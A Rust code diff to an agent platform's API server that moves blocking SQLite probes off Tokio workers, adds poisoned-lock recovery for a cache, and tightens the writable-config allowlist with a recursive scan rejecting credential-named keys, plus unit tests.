+pub(crate) fn scrubbed_key_in_payload(value: &serde_json::Value) -> Option<String> {
+    match value {
+        serde_json::Value::Object(map) => {
+            for (key, inner) in map {
+                if is_scrubbed_config_key(key) {
+                    return Some(key.clone());
+                }
+                if let Some(found) = scrubbed_key_in_payload(inner) {
+                    return Some(found);
+                }
+            }
+            None
+        }
+        serde_json::Value::Array(items) => items.iter().find_map(scrubbed_key_in_payload),
+        _ => None,
     }
-    true
 }
 
 /// Convert a serde_json::Value to a toml_edit::Value (format-preserving).
@@ -1101,15 +1188,30 @@ async fn dashboard_snapshot_inner(state: &Arc<AppState>) -> serde_json::Value {
 }
 
 async fn dashboard_snapshot_compute(state: &Arc<AppState>) -> serde_json::Value {
+    let (memory_used_mb, hostname) = tokio::join!(current_process_rss_mb(), system_hostname());
     // Health (same logic as /api/health)
     let shared_id = librefang_types::agent::AgentId(uuid::Uuid::from_bytes([
         0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1,
     ]));
-    let db_ok = state
-        .kernel
-        .memory_substrate()
-        .structured_get(shared_id, "__health_check__")
-        .is_ok();
+    let substrate = Arc::clone(state.kernel.memory_substrate());
+    // The memory substrate exposes synchronous SQLite operations. Run the
+    // health probe and session count together on the blocking pool so the
+    // dashboard's frequent snapshot poll cannot stall a Tokio worker.
+    let db_result = tokio::task::spawn_blocking(move || {
+        let db_ok = substrate
+            .structured_get(shared_id, "__health_check__")
+            .is_ok();
+        let session_count = substrate.count_sessions().unwrap_or(0);
+        (db_ok, session_count)
+    })
+    .await;
+    let (db_ok, session_count) = match db_result {
+        Ok(result) => result,
+        Err(error) => {
+            tracing::error!(%error, "dashboard database probe task failed");
+            (false, 0)
+        }
+    };
     let health_status = if db_ok { "ok" } else { "degraded" };
     let fts_only = state.kernel.config_ref().memory.fts_only.unwrap_or(false);
     let embedding_ok = fts_only || state.kernel.embedding().is_some();
@@ -1134,17 +1236,11 @@ async fn dashboard_snapshot_compute(state: &Arc<AppState>) -> serde_json::Value 
     // decoding every session blob just to call `.len()`. This is the
     // dashboard snapshot path (`/api/dashboard/snapshot`), hit on
     // every 5 s poll, so the cost compounded.
-    let session_count = state
-        .kernel
-        .memory_substrate()
-        .count_sessions()
-        .unwrap_or(0);
     let cfg = state.kernel.config_snapshot();
     // Runtime stats shared with `/api/status` — the dashboard RuntimePage
     // reads these out of the snapshot for its info panel and KPI tiles.
     // Anything missing here renders as "-" on the page.
     let uptime_seconds = state.started_at.elapsed().as_secs();
-    let memory_used_mb = current_process_rss_mb();
     let status = serde_json::json!({
         "version": env!("CARGO_PKG_VERSION"),
         "agent_count": agent_count,
@@ -1154,11 +1250,11 @@ async fn dashboard_snapshot_compute(state: &Arc<AppState>) -> serde_json::Value 
         "memory_used_mb": memory_used_mb,
         "default_provider": cfg.default_model.provider,
         "default_model": cfg.default_model.model,
-        "config_exists": state.kernel.home_dir().join("config.toml").exists(),
+        "config_exists": state.kernel.config_path().exists(),
         "api_listen": cfg.api_listen,
         "home_dir": state.kernel.home_dir().display().to_string(),
         "log_level": cfg.log_level,
-        "hostname": system_hostname(),
+        "hostname": hostname,
         "network_enabled": cfg.network_enabled,
         "terminal_enabled": cfg.terminal.enabled,
     });
@@ -1193,9 +1289,7 @@ async fn dashboard_snapshot_compute(state: &Arc<AppState>) -> serde_json::Value 
     static SKILL_COUNT_CACHE: std::sync::Mutex<Option<(usize, std::time::Instant)>> =
         std::sync::Mutex::new(None);
     let skill_count = {
-        let cached = SKILL_COUNT_CACHE
-            .lock()
-            .unwrap_or_else(|p| p.into_inner())
+        let cached = lock_skill_count_cache(&SKILL_COUNT_CACHE)
             .as_ref()
             .and_then(|(n, t)| {
                 if t.elapsed() < std::time::Duration::from_secs(30) {
@@ -1217,8 +1311,7 @@ async fn dashboard_snapshot_compute(state: &Arc<AppState>) -> serde_json::Value 
                     .read()
                     .map(|r| r.list().len())
                     .unwrap_or(0);
-                *SKILL_COUNT_CACHE.lock().unwrap_or_else(|p| p.into_inner()) =
-                    Some((n, std::time::Instant::now()));
+                *lock_skill_count_cache(&SKILL_COUNT_CACHE) = Some((n, std::time::Instant::now()));
                 n
             }
         }
@@ -1248,6 +1341,41 @@ async fn dashboard_snapshot_compute(state: &Arc<AppState>) -> serde_json::Value 
         "workflowCount": workflow_count,
         "webSearchAvailable": web_search_available,
     })
+}
+
+fn lock_skill_count_cache<T>(mutex: &std::sync::Mutex<T>) -> std::sync::MutexGuard<'_, T> {
+    mutex.lock().unwrap_or_else(|poisoned| {
+        tracing::warn!("dashboard skill count cache lock poisoned; recovering cached value");
+        mutex.clear_poison();
+        poisoned.into_inner()
+    })
+}
+
+#[cfg(test)]
+mod skill_count_cache_lock_tests {
+    use super::lock_skill_count_cache;
+    use std::sync::Mutex;
+
+    #[test]
+    fn poisoned_cache_lock_recovers_preserved_value_and_remains_usable() {
+        let cache = Mutex::new(Some(7usize));
+        let poison = std::thread::scope(|scope| {
+            scope
+                .spawn(|| {
+                    let mut value = cache.lock().unwrap();
+                    *value = Some(11);
+                    panic!("poison skill count cache lock");
+                })
+                .join()
+        });
+        assert!(poison.is_err());
+        assert!(cache.is_poisoned());
+        assert_eq!(*lock_skill_count_cache(&cache), Some(11));
+        assert!(!cache.is_poisoned());
+
+        *lock_skill_count_cache(&cache) = Some(13);
+        assert_eq!(*cache.lock().unwrap(), Some(13));
+    }
 }
 
 #[cfg(test)]
@@ -1478,9 +1606,16 @@ url = "https://search.example.com"
 
     #[test]
     fn issue_3458_writable_path_allowlist() {
+        // `ui.theme` / `ui.locale` / `ui.timezone` / `ui.language` were asserted writable here from #4113 until #6605 removed them from the allowlist.
+        // There is no `ui` field on `KernelConfig` and there never was, so accepting a write against those paths wrote a `[ui]` table that the next config load discarded — a silent no-op reported to the caller as success.
+        // They are pinned closed now so the entries cannot come back without the backing struct.
+        // `every_writable_allowlist_entry_has_a_backing_config_field` (in `manage`) generalises this to the whole allowlist.
+        assert!(!super::is_writable_config_path("ui.theme"));
+        assert!(!super::is_writable_config_path("ui.locale"));
+        assert!(!super::is_writable_config_path("ui.timezone"));
+        assert!(!super::is_writable_config_path("ui.language"));
+
         // User-tunable scalars are accepted.
-        assert!(super::is_writable_config_path("ui.theme"));
-        assert!(super::is_writable_config_path("ui.locale"));
         assert!(super::is_writable_config_path("max_history_messages"));
         assert!(super::is_writable_config_path("log_level"));
         assert!(super::is_writable_config_path("approval.auto_approve"));
@@ -1491,6 +1626,8 @@ url = "https://search.example.com"
         // Sectioned tunables — single leaf and one nested level both allowed.
         assert!(super::is_writable_config_path("web.search_provider"));
         assert!(super::is_writable_config_path("rate_limit.max_ws_per_ip"));
+        // This one pins the depth rule, NOT a backing field: post-sidecar-migration `ChannelsConfig` declares no per-vendor sub-table, so `channels.telegram.enabled` resolves to nothing and is the same silent-no-op shape as the `ui.*` paths above.
+        // It is left asserted-writable because dropping `channels.` or moving it to depth 1 changes the write surface, which is a maintainer call — see the note at `WRITABLE_DEPTH_2_ONLY_PREFIXES` for the evidence and both candidate repairs.
         assert!(super::is_writable_config_path("channels.telegram.enabled"));
 
         // Account / credential paths MUST be rejected.
@@ -1536,6 +1673,14 @@ url = "https://search.example.com"
         assert!(!super::is_writable_config_path(
             "external_auth.require_email_verified"
         ));
+        // #7744: `role_map` is what turns a signed ID token into an API credential, so a caller who could write it could grant themselves Owner by naming an IdP group they already hold.
+        assert!(!super::is_writable_config_path("external_auth.role_map"));
+        // #7746: same reasoning for the group side. Writing `group_map` would
+        // let a caller join themselves to any team — and a team owns artifacts
+        // and confers binding-rule role strings — while writing `claim_paths`
+        // would let them redirect both maps at a claim they control.
+        assert!(!super::is_writable_config_path("external_auth.group_map"));
+        assert!(!super::is_writable_config_path("external_auth.claim_paths"));
         assert!(!super::is_writable_config_path("oauth.google_client_id"));
         assert!(!super::is_writable_config_path("audit.anchor_path"));
         assert!(!super::is_writable_config_path("audit.retention_days"));
@@ -1700,5 +1845,99 @@ mod migrate_roots_tests {
             false,
         )
         .is_err());
+    }
+}
+
+#[cfg(test)]
+mod scrub_payload_tests {
+    use super::{is_scrubbed_config_key, is_writable_config_path, scrubbed_key_in_payload};
+
+    /// The refactor that introduced `is_scrubbed_config_key` must not have moved
+    /// the path check's boundary. Each case below is the behaviour the dotted
+    /// `SCRUB_SUFFIXES` list had: the final segment is matched exactly, so
+    /// `shared_secret` is caught by its own entry while `bot_token` — which no
+    /// entry names — is not.
+    #[test]
+    fn path_scrub_boundary_is_unchanged_by_the_shared_predicate() {
+        for closed in [
+            "media.api_key",
+            "media.custom_stt.api_key_env",
+            "web.brave.token",
+            "llm.shared_secret",
+            "queue.admin",
+            "skills.client_secret",
+        ] {
+            assert!(
+                !is_writable_config_path(closed),
+                "`{closed}` must stay closed"
+            );
+        }
+        for open in [
+            "media.custom_stt.base_url",
+            "web.search_provider",
+            "queue.concurrency.trigger_lane",
+        ] {
+            assert!(is_writable_config_path(open), "`{open}` must stay writable");
+        }
+        // Not named by any entry, and not caught by a suffix — unchanged from
+        // the pre-#8085 behaviour, and called out in the PR rather than widened
+        // here, because widening would change which paths are writable.
+        assert!(is_scrubbed_config_key("api_key_env"));
+        assert!(!is_scrubbed_config_key("bot_token"));
+    }
+
+    /// The scan has to find a scrubbed key wherever it sits, because the handler
+    /// assigns the whole submitted value at the path.
+    #[test]
+    fn payload_scan_finds_a_credential_key_at_every_depth() {
+        let cases = [
+            serde_json::json!({"api_key_env": "X"}),
+            serde_json::json!({"outer": {"api_key_env": "X"}}),
+            serde_json::json!({"outer": {"inner": {"token": "X"}}}),
+            serde_json::json!([{"client_secret": "X"}]),
+            serde_json::json!({"list": [{"password": "X"}]}),
+            serde_json::json!({"a": 1, "shared_secret": "X"}),
+        ];
+        for case in cases {
+            assert!(
+                scrubbed_key_in_payload(&case).is_some(),
+                "must be caught: {case}"
+            );
+        }
+    }
+
+    /// A payload with nothing credential-shaped must pass, or the scan would be
+    /// a blanket ban on object-valued writes and would break the primitive
+    /// collection sections (`provider_urls`, `tool_timeouts`, …) that round-4
+    /// of #4678 deliberately opened.
+    #[test]
+    fn payload_scan_passes_a_clean_payload() {
+        let cases = [
+            serde_json::json!({"base_url": "http://localhost/", "model": "m"}),
+            serde_json::json!({"openai": "http://localhost:9001/v1"}),
+            serde_json::json!({"nested": {"voice": "alloy", "format": "mp3"}}),
+            serde_json::json!("a plain string"),
+            serde_json::json!(7),
+            serde_json::json!(null),
+            serde_json::json!([1, 2, 3]),
+        ];
+        for case in cases {
+            assert_eq!(
+                scrubbed_key_in_payload(&case),
+                None,
+                "must pass cleanly: {case}"
+            );
+        }
+    }
+
+    /// The reported key is the one the operator has to go and edit, so it must
+    /// be the offending name rather than the first key seen.
+    #[test]
+    fn payload_scan_reports_the_offending_key_name() {
+        let value = serde_json::json!({"base_url": "http://a/", "api_key_env": "X"});
+        assert_eq!(
+            scrubbed_key_in_payload(&value).as_deref(),
+            Some("api_key_env")
+        );
     }
 }
